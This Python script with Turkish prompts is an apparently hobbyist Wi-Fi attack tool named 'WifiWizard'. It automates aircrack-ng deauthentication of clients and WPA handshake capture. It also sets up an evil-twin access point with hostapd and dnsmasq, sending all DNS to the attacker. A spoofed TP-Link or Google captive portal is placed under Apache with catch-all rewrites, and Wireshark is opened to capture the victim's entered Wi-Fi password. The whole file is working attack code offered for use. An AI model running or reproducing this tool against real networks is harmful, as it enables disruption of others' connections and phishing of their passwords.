import os
import time
clear=lambda: os.system('clear')
clear()
sistem=input("Kullandığınız İşletim Sistemi Hangi Dilde?\n\n1-İngilizce\n2-Türkçe\n\nCevap:")
if(sistem=="1"):
	print("Sistem Dili:İngilizce")
elif(sistem=="2"):
	print("Sistem Dili:Türkçe")
else:
	print("Sistem Dili:Bilinmiyor!!")
	time.sleep(3)
	print("Sistem Diliniz Türkçe Veya İngilizce Olmalıdır!!")
	time.sleep(4)
	clear()
	exit()
time.sleep(4)
clear()
class WifiWizard():
	def agdankov(self):
		import os,sys
		import time 
		airmon=lambda: os.system('airmon-ng start wlan0 ')
		airmon()
		clear=lambda: os.system('clear')
		clear()
		print("Birazdan karşınıza gelecek olan\nEkrandan çıkmak için\nCTRL+C yapıp ENTER'a basmanız yeterlidir..")
		bilgi=input("Devam Etmek İçin Herhangi Bir Tuşa Basınız:")
		airodump=lambda: os.system('airodump-ng wlan0mon')
		airodump()
		aziz=input("Enter'a Basın:q")
		if(aziz=="q"):
			airodump.exit()
		print("******************************************")
		bssid=input("BSSİD:")
		channel=input("CHANNEL:")
		print("******************************************")
		print("Bilgiler Sorgulanıyor..")
		time.sleep(4)
		airodump1=lambda: os.system('airodump-ng --bssid {} --channel {}  wlan0mon'.format(bssid,channel))
		airodump1()
		print("******************************************")
		kov=input("Kovulacak Süre(saniye cinsinden):")
		station=input("STATİON:")
		print("******************************************")
		print("Bilgiler Sorgulanıyor..")
		time.sleep(4)
		airodump1=lambda: os.system('aireplay-ng --deauth {} -a {} -c {}  wlan0mon'.format(kov,bssid,station))
		airodump1()	
	def handshakeyakala(self):
		import os,sys
		import time 
		airmon=lambda: os.system('airmon-ng start wlan0 ')
		airmon()
		clear=lambda: os.system('clear')
		clear()
		print("Birazdan karşınıza gelecek olan\nEkrandan çıkmak için\nCTRL+C yapıp ENTER'a basmanız yeterlidir..")
		bilgi=input("Devam Etmek İçin Herhangi Bir Tuşa Basınız:")
		airodump=lambda: os.system('airodump-ng wlan0mon')
		airodump()
		aziz=input("Enter'a Basın:q")
		if(aziz=="q"):
			airodump.exit()
		print("******************************************")
		bssid=input("BSSİD:")
		channel=input("CHANNEL:")
		handshake=input("HANDSHAKE'İN İSMİ:")
		print("******************************************")
		print("Bilgiler Sorgulanıyor..")
		time.sleep(4)		
		airodump1=lambda: os.system('airodump-ng --bssid {} --channel {} --write {} wlan0mon'.format(bssid,channel,handshake))
		airodump1()		
	def handshakedosya(self):
		dosya=input("OLUŞTURLACAK HANDSHAKE DOSYASININ ADI:")
		f = open("{}.py".format(dosya),"w" )		
		f.write("""
import time 
print("****************************************************")
print("\ \      / (_)/ _(_) \      / (_)______ _ _ __ __| |")
print(" \ \ /\ / /| | |_| |\ \ /\ / /| |_  / _` | '__/ _` |")
print("  \ V  V / | |  _| | \ V  V / | |/ / (_| | | | (_| |")
print("   \_/\_/  |_|_| |_|  \_/\_/  |_/___\__,_|_|  \__,_|")
print("       ▂▃▄▅▆▇█▓▒░𝒃𝒚 : 𝑨𝒛𝒊𝒛 𝑲𝒂𝒑𝒍𝒂𝒏░▒▓█▇▆▅▄▃▂                       ")
print("****************************************************")
print("Lütfen Bekleyiniz..")
time.sleep(5)
import os,sys
airmon=lambda: os.system('airmon-ng start wlan0 ')
airmon()
clear=lambda: os.system('clear')
clear()
print("Birazdan karşınıza gelecek olan Ekrandan çıkmak için CTRL+C yapıp ENTER'a basmanız yeterlidir..")
bilgi=input("Devam Etmek İçin Herhangi Bir Tuşa Basınız:")
airodump=lambda: os.system('airodump-ng wlan0mon')
airodump()
aziz=input("Enter'a Basın:q")
if(aziz=="q"):
	airodump.exit()
print("******************************************")
bssid=input("BSSİD:")
channel=input("CHANNEL:")
print("******************************************")
print("Bilgiler Sorgulanıyor..")
time.sleep(4)
airodump1=lambda: os.system('airodump-ng --bssid {} --channel {}  wlan0mon'.format(bssid,channel))
airodump1()
print("******************************************")
kov=input("Kovulacak Süre(saniye cinsinden):")
station=input("STATİON:")
print("******************************************")
print("Bilgiler Sorgulanıyor..")
time.sleep(4)
airodump1=lambda: os.system('aireplay-ng --deauth {} -a {} -c {}  wlan0mon'.format(kov,bssid,station))
airodump1()	
""")		
	def wifihackle(self):
		import os
		import time
		clear=lambda: os.system('clear')
		clear()
		airmon1=lambda: os.system('airmon-ng stop wlan0mon')
		airmon1() 
		restart=lambda: os.system('service network-manager restart')
		restart() 
		print("Lütfen Bekleyiniz..")
		time.sleep(18)
		clear()		
		#ÖN AYAR
		network_manager_stop=lambda: os.system('service network-manager stop')
		network_manager_stop()
		echo=lambda: os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
		echo()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables=lambda: os.system('iptables --flush')
		iptables()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables1=lambda: os.system('iptables --table nat --flush')
		iptables1()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables2=lambda: os.system('iptables --delete-chain')
		iptables2()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables3=lambda: os.system('iptables --table nat --delete-chain')
		iptables3()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables4=lambda: os.system('iptables -P FORWARD ACCEPT')
		iptables4()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		 #DNS AYARLARI
		clear()
		if(sistem=="1"):
			print("Documents dizininde bir dosya oluşturulacak.(/root/Documents/)\n\n")
		elif(sistem=="2"):
			print("Documents dizininde bir dosya oluşturulacak.(/root/Belgeler/)\n\n")
		print("***********************************")
		dosya1=input("OLUŞTURULACAK KLASÖRÜN ADI:")
		print("***********************************")
		if(sistem=="1"):
			mkdir=lambda: os.system('mkdir /root/Documents/{}'.format(dosya1))
			mkdir()
			dnsmasq=open("/root/Documents/{}/dnsmasq.conf".format(dosya1),"w")
		elif(sistem=="2"):
			mkdir=lambda: os.system('mkdir /root/Belgeler/{}'.format(dosya1))
			mkdir()
			dnsmasq=open("/root/Belgeler/{}/dnsmasq.conf".format(dosya1),"w")	
		print("****************************************************************************************")
		dnsoru=input("İNTERFACE(wlan0 veya eth0):")
		agkartı=input("MODEM İP(192.168.1.1/192.168.2.1):")
		dhcp=input("DHCP SUNUCUSUNUN DAĞITACAĞI İP ADRESİ(Küçük olan örn:192.168.1.10):")
		dhcp2=input("DHCP SUNUCUSUNUN DAĞITACAĞI İP ADRESİ(Büyük olan örn:192.168.1.120):")
		print("****************************************************************************************")	
		dnsmasq.write("""
		
interface = {}

dhcp-range = {}, {}, 8h

dhcp-option = 3, {}

dhcp-option = 6, {}

address = /#/{}
		


""".format(dnsoru,dhcp,dhcp2,agkartı,agkartı,agkartı))
		print("dnsmasq.conf  oluşturuluyor..")
		print("\nLütfen Bekleyin..")
		time.sleep(4)
		clear()
		print("dnsmasq.conf oluşturuldu!")
		time.sleep(3)
		clear()
		print("******************************************")
		ssid=input("SSİD:")
		channel=input("CHANNEL:")
		print("******************************************")
		if(sistem=="1"):
			hostapd=open('/root/Documents/{}/hostapd.conf'.format(dosya1),"w")
		elif(sistem=="2"):
			hostapd=open("/root/Belgeler/{}/hostapd.conf".format(dosya1),"w")
		hostapd.write("""
interface={}

ssid={}

channel={}

""".format(dnsoru,ssid,channel))
		print("hostapd.conf  oluşturuluyor..")
		print("\nLütfen Bekleyin..")
		time.sleep(4)
		clear()					
	def hostapd_dnsmasq_cozum(self):
		import os,sys
		import time
		network_manager_stop=lambda: os.system('service network-manager stop')
		network_manager_stop()
		echo=lambda: os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
		echo()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables=lambda: os.system('iptables --flush')
		iptables()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables1=lambda: os.system('iptables --table nat --flush')
		iptables1()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables2=lambda: os.system('iptables --delete-chain')
		iptables2()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables3=lambda: os.system('iptables --table nat --delete-chain')
		iptables3()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		iptables4=lambda: os.system('iptables -P FORWARD ACCEPT')
		iptables4()
		print("Komut Otomatik Giriliyor..")
		time.sleep(1)
		clear=lambda: os.system('clear')
		clear()
		if(sistem=="1"):	
			print("Az Önce Girdiğiniz Klasörün Adını Giriniz.(/root/Documents/)\n\n")
		elif(sistem=="2"):
			print("Az Önce Girdiğiniz Klasörün Adını Giriniz.(/root/Belgeler/)\n\n")
		print("*************************************************")
		dosya1=input("KLASÖRÜN ADI:")
		print("*************************************************")
		if(sistem=="1"):
			kontrol=lambda: os.system('dnsmasq -C /root/Documents/{}/dnsmasq.conf'.format(dosya1))
			kontrol()
		elif(sistem=="2"):
			kontrol=lambda: os.system('dnsmasq -C /root/Belgeler/{}/dnsmasq.conf'.format(dosya1))
			kontrol()
		print("Gerekli Komutlar Giriliyor..")
		time.sleep(3)
		kapa=lambda: os.system('service network-manager stop')
		kapa()
		time.sleep(4)
		if(sistem=="1"):
			hostapd1=lambda: os.system('hostapd /root/Documents/{}/hostapd.conf -B'.format(dosya1))
			hostapd1()
		elif(sistem=="2"):
			hostapd1=lambda: os.system('hostapd /root/Belgeler/{}/hostapd.conf -B'.format(dosya1))
			hostapd1()
		time.sleep(5)
		print("*************************************************")
		soru=input("YUKARIDAKİ ÇIKTI NEYDİ(AP-ENABLED/AP-DISABLED):")
		print("*************************************************")	
		if(soru=="1" or soru=="ap-enabled" or soru=="AP-ENABLED"):
			print("hostapd.conf başarıyla oluşturuldu!")
		else:
			ac=lambda: os.system('service network-manager start')
			ac()
			print("Hatanın Çözümü İçin Uğraşılıyor..")
			time.sleep(13)
			kapa()
			print("Hatanın Çözümü İçin Uğraşılıyor..")
			time.sleep(3)
			hostapd1()
			print("*************************************************")
			hostapd_error=input("YUKARIDAKİ ÇIKTI NEYDİ(AP-ENABLED/AP-DISABLED):")
			print("*************************************************")
			if(hostapd_error=="1" or hostapd_error=="AP-ENABLED" or hostapd_error=="ap-enabled"):
				print("Hata Başarılı Bir Şekilde Çözüldü!")
			else:
				yeniden_baslat=lambda: os.system('service network-manager restart')
				yeniden_baslat()
				print("Hatanın Çözümü İçin Uğraşılıyor..")
				time.sleep(15)
				kapa()
				time.sleep(3)
				hostapd1()
				print("*************************************************")
				hostapd_error=input("YUKARIDAKİ ÇIKTI NEYDİ(AP-ENABLED/AP-DISABLED):")
				print("*************************************************")
				if(hostapd_error=="1" or hostapd_error=="AP-ENABLED" or hostapd_error=="ap-enabled"):
					print("Hata Başarılı Bir Şekilde Çözüldü!")
				else:
					clear()
					print("---------------------------------------------------------------------------------")
					print("Lütfen sisteminizi yeniden başlatıp\nArdından,bu programı açıp '5'e basın.")
					print("---------------------------------------------------------------------------------")
					time.sleep(6)
					exit()
	def wifidevam(self):
		import os
		import time	
		clear=lambda: os.system('clear')
		clear()
		sc=input('Kullanılacak Scripti Seçiniz:\n\n1-tplink_tr\n2-google_tr\n\nSeçim:')
		if(sc=="1" or sc=="tplink_tr"):
			script_yolu=lambda: os.system('cp -r tplink_tr/* /var/www/html/')
			print("/var/www/html/ klasörüne kopyalanıyor..")			
			time.sleep(4)
			script_yolu()
		elif(sc=="2" or sc=="google_tr"):
			script_yolu1=lambda: os.system('cp -r google_tr/* /var/www/html/')
			print("/var/www/html/ klasörüne kopyalanıyor..")			
			time.sleep(4)
			script_yolu1()
		print("*********************************")
		modem_ip=input("MODEM İP(192.168.1.1/192.168.2.1):")
		print("*********************************")
		captive_calistir=lambda: os.system('ifconfig wlan0 {} netmask 255.255.255.0'.format(modem_ip))
		captive_calistir()
		time.sleep(2)
		apache2=lambda: os.system('service apache2 start')
		apache2()
		default=lambda: os.system('rm -r /etc/apache2/sites-enabled/000-default.conf')
		default()
		print("000-default.conf siliniyor..")
		time.sleep(3)
		print("İos ve Android uyumlu kodlanmış 000-default.conf oluşturuluyor..")
		time.sleep(4)
		ipyonlendir=open("/etc/apache2/sites-enabled/000-default.conf","w")
		ipyonlendir.write("""
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/
	ErrorDocument 404 /

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf

</VirtualHost>

<Directory "/var/www/html">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
	
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>


# vim: syntax=apache ts=4 sw=4 sts=4 sr noet		
""")
		a2enmod=lambda: os.system('a2enmod rewrite')
		a2enmod()
		print("Gerekli Komutlar Giriliyor..")
		time.sleep(3)
		apache2_start=lambda: os.system('service apache2 start')
		apache2_start()
		print("Gerekli Komutlar Giriliyor..")
		time.sleep(3)
		clear=lambda: os.system('clear')
		clear()
		print("Bundan sonra şifreyi bulmak kalıyor!\nBunun için wireshark'dan yararlanabilirsiniz.")
		wireshark=lambda: os.system('wireshark')
		wireshark()
hacking=WifiWizard()
while True:
	print("""
****************************************************
\ \      / (_)/ _(_) \      / (_)______ _ _ __ __| |
 \ \ /\ / /| | |_| |\ \ /\ / /| |_  / _` | '__/ _` |
  \ V  V / | |  _| | \ V  V / | |/ / (_| | | | (_| |
   \_/\_/  |_|_| |_|  \_/\_/  |_/___\__,_|_|  \__,_|
      ▂▂▃▄▅▆▇█▓▒░𝒃𝒚 : 𝑨𝒛𝒊𝒛 𝑲𝒂𝒑𝒍𝒂𝒏░▒▓█▇▆▅▄▃▂▂      
****************************************************                 
""")
	
	secim=input("Seçiniz:\n1-Kişiyi Ağdan Kov\n2-Handshake Yakala\n3-Wifi Hackle\n4-Monitör Moddan Çık\n5-Hostapd Error\n6-Çıkış Yap\n\nSeçim:")
	if(secim=="1"):	
		import time
		print("Lütfen Bekleyiniz..")
		time.sleep(4)
		hacking.agdankov()
	elif(secim=="2"):
		hacking.handshakedosya()
		hacking.handshakeyakala()
	elif(secim=="3"):
		hacking.wifihackle()
		hacking.hostapd_dnsmasq_cozum()
		hacking.wifidevam()		
	elif(secim=="4"):
		import os
		import time
		clear=lambda: os.system('clear')
		clear()
		airmon1=lambda: os.system('airmon-ng stop wlan0mon')
		airmon1()
		print("Monitör Moddan Çıkılıyor..")
		time.sleep(3)
	elif(secim=="5"):
		hacking.hostapd_dnsmasq_cozum()
		hacking.wifidevam()
	elif(secim=="6"):
		import os
		import time
		airmon1=lambda: os.system('airmon-ng stop wlan0mon')
		airmon1()
		print("Monitör Moddan Çıkılıyor..")
		time.sleep(3)
		ntmn=lambda: os.system('service network-manager restart')
		ntmn()
		print("Network-Manager Başlatılıyor..")
		time.sleep(16)
		apache2_stop=lambda: os.system('service apache2 stop')
		apache2_stop()
		print("Apache2 Durduruluyor..")
		time.sleep(4)
		print("Çıkış Yapılıyor..")
		time.sleep(3)
		print("Ekran Temizleniyor..")
		time.sleep(3)
		clear=lambda: os.system('clear')
		clear()
		break
